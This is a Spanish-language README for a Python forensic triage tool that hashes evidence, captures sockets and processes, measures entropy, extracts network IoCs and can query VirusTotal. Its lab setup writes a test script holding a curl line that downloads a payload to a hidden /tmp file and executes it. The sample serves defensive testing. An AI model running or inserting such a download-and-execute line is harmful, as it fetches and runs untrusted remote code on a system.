# Linux Forensic Triage & Chain of Custody Tool

Herramienta de línea de comandos (CLI) desarrollada en **Python** para automatizar el triaje forense inicial, la preservación de integridad (cadena de custodia) y el análisis estático de artefactos en entornos **Linux**.

## Capacidades Principales
- **Cadena de Custodia Automatizada:** Cálculo simultáneo de hashes criptográficos **MD5** y **SHA-256** por bloques para archivos sospechosos y salidas de comandos del sistema.
- **Recolección de Telemetría Volátil (Linux):** Captura automatizada de sockets de red activos (`ss -tunap`) y árbol de procesos (`ps aux`) con marca de tiempo UTC y sellado de integridad.
- **Análisis Estático y Entropía de Shannon:** Detección matemática de artefactos cifrados o empaquetados (entropía >= 7.5) y extracción de IoCs de red (URLs e IPs) mediante expresiones regulares.
- **Enriquecimiento Threat Intelligence:** Integración opcional con la API v3 de **VirusTotal** (`--vt-key` o variable de entorno `VT_API_KEY`).
- **Reportes Estructurados:** Exportación dual en **Markdown** (acta técnica legible) y **JSON** (integrable con SIEM/SOAR).

## Estructura del Proyecto
```text
linux-forensic-triage/
├── forensic_triage.py    # Motor principal CLI
├── evidencia/            # Artefactos de prueba para validación
├── reportes/             # Actas generadas (triage_report.md / .json)
└── README.md
```

## Uso y Reproducción en Laboratorio

### 1. Generar artefactos de prueba
Para validar la detección de entropía y extracción de IoCs sin utilizar malware real, puedes generar un entorno de prueba aislado:

```bash
mkdir -p evidencia reportes
cat << 'EOF' > evidencia/update_cron.sh
#!/bin/bash
curl -s http://185.220.101.4/payload.bin -o /tmp/.sysd && chmod +x /tmp/.sysd && /tmp/.sysd
EOF
head -c 51200 /dev/urandom > evidencia/blob_cifrado.bin
```

### 2. Ejecutar el triaje forense
```bash
# Ejecución estándar (triaje local y cadena de custodia)
python3 forensic_triage.py -d evidencia

# Ejecución con consulta en tiempo real a VirusTotal
python3 forensic_triage.py -d evidencia --vt-key TU_API_KEY
```

## Evidencia de Ejecución y Cadena de Custodia
<img width="1027" height="456" alt="Captura de pantalla 2026-11-23 214808" src="https://github.com/user-attachments/assets/53a6a11e-e8ef-4925-8738-8a06b96a6fd1" />
